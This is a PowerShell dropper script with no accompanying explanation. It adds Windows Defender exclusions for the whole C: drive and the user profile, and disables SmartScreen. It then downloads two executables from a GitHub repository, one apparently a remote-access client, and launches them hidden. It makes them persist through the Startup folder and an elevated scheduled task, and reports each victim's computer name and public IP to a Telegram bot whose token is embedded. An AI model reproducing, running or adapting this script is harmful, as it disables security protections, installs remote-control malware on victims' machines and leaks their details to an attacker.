$BOT_TOKEN = "7749203875:AAGt7Bz2LGA4LRNXhFS3Pt_ZzdiFfLG6a44"
$CHAT_ID = "6540998609"
$API_URL = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
$MAX_ATTEMPTS = 3
$TEMP_DIR = ""

function Send-TelegramMessage {
    param([string]$Message)
    try {
        $Body = @{chat_id = $CHAT_ID; text = $Message}
        $JSON = $Body | ConvertTo-Json
        $Bytes = [System.Text.Encoding]::UTF8.GetBytes($JSON)
        $Request = [System.Net.WebRequest]::Create($API_URL)
        $Request.Method = "POST"
        $Request.ContentType = "application/json"
        $Request.ContentLength = $Bytes.Length
        $Stream = $Request.GetRequestStream()
        $Stream.Write($Bytes, 0, $Bytes.Length)
        $Stream.Close()
        $Response = $Request.GetResponse()
        $Response.Close()
    }
    catch {}
}

function Get-PublicIP {
    try {
        $services = @("https://api.ipify.org","https://ipinfo.io/ip","https://ifconfig.me/ip","https://checkip.amazonaws.com")
        foreach ($service in $services) {
            try {
                $ip = (Invoke-WebRequest -Uri $service -TimeoutSec 5).Content.Trim()
                if ($ip -match '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$') { return $ip }
            }
            catch { continue }
        }
        return "Unknown IP"
    }
    catch { return "IP Error" }
}

function New-TempDirectory {
    $RandomString = -join ((65..90) + (48..57) | Get-Random -Count 8 | ForEach-Object {[char]$_})
    $TEMP_DIR = Join-Path -Path $env:TEMP -ChildPath $RandomString
    New-Item -ItemType Directory -Path $TEMP_DIR -Force | Out-Null
    return $TEMP_DIR
}

function Invoke-DownloadWithRetry {
    param([string]$Url, [string]$FileName)
    for ($i = 0; $i -lt $MAX_ATTEMPTS; $i++) {
        try {
            $FilePath = Join-Path -Path $TEMP_DIR -ChildPath $FileName
            Invoke-WebRequest -Uri $Url -OutFile $FilePath -ErrorAction Stop
            return $FilePath
        }
        catch {
            if ($i -eq ($MAX_ATTEMPTS - 1)) { Send-TelegramMessage "❌ Failed to download $FileName after $MAX_ATTEMPTS attempts" }
            Start-Sleep -Seconds 2
        }
    }
    return $null
}

function Add-DefenderExclusions {
    try {
        $Paths = @("C:\", $env:USERPROFILE)
        foreach ($Path in $Paths) { Add-MpPreference -ExclusionPath $Path -Force -ErrorAction Stop }
    }
    catch { Send-TelegramMessage "⚠️ Defender exclusion failed" }
}

function Disable-SmartScreen {
    try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop }
    catch { Send-TelegramMessage "⚠️ SmartScreen disable failed" }
}

function Start-ExeFile {
    param([string]$ExePath)
    try { 
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $ExePath
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        [System.Diagnostics.Process]::Start($psi) | Out-Null
        return $true 
    }
    catch { 
        Send-TelegramMessage "⚠️ EXE execution failed"
        return $false 
    }
}

function Add-Persistence {
    param([string]$FilePath)
    try {
        $StartupPath = Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Windows\Start Menu\Programs\Startup"
        Copy-Item -Path $FilePath -Destination (Join-Path -Path $StartupPath -ChildPath (Split-Path -Leaf $FilePath)) -Force -ErrorAction Stop
        $Action = New-ScheduledTaskAction -Execute $FilePath
        $Trigger = New-ScheduledTaskTrigger -AtStartup
        $Settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName "PersistentApp" -Action $Action -Trigger $Trigger -Settings $Settings -RunLevel Highest -Force -ErrorAction Stop | Out-Null
    }
    catch { Send-TelegramMessage "⚠️ Persistence failed" }
}

function Invoke-Cleanup {
    try { Remove-Item -Path $TEMP_DIR -Recurse -Force -ErrorAction SilentlyContinue }
    catch {}
}

try {
    [System.Console]::OutputEncoding = [System.Text.Encoding]::UTF8
} catch {
}

$PCName = $env:COMPUTERNAME
$IP = Get-PublicIP
Send-TelegramMessage "🚀 Starting on $PCName [$IP] at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

$TEMP_DIR = New-TempDirectory
Send-TelegramMessage "📁 Temp folder: $TEMP_DIR"
Add-DefenderExclusions
Disable-SmartScreen

$ExePath1 = Invoke-DownloadWithRetry -Url "https://github.com/nahilagirl/s64projetc/raw/refs/heads/main/binloader.exe" -FileName "binloader.exe"
if ($ExePath1 -ne $null) {
    Send-TelegramMessage "📦 First EXE downloaded successfully"
    $ExeStarted = Start-ExeFile -ExePath $ExePath1
    if ($ExeStarted) {
        Send-TelegramMessage "✅ First EXE launched successfully"
        Add-Persistence -FilePath $ExePath1
    }
}

$ExePath2 = Invoke-DownloadWithRetry -Url "https://github.com/nahilagirl/s64projetc/raw/refs/heads/main/XClient.exe" -FileName "XClient.exe"
if ($ExePath2 -ne $null) {
    Send-TelegramMessage "📦 Second EXE downloaded successfully"
    $ExeStarted = Start-ExeFile -ExePath $ExePath2
    if ($ExeStarted) {
        Send-TelegramMessage "✅ Second EXE launched successfully"
        Add-Persistence -FilePath $ExePath2
    }
}

Invoke-Cleanup
Send-TelegramMessage "🏁 Completed operations on $PCName [$IP]"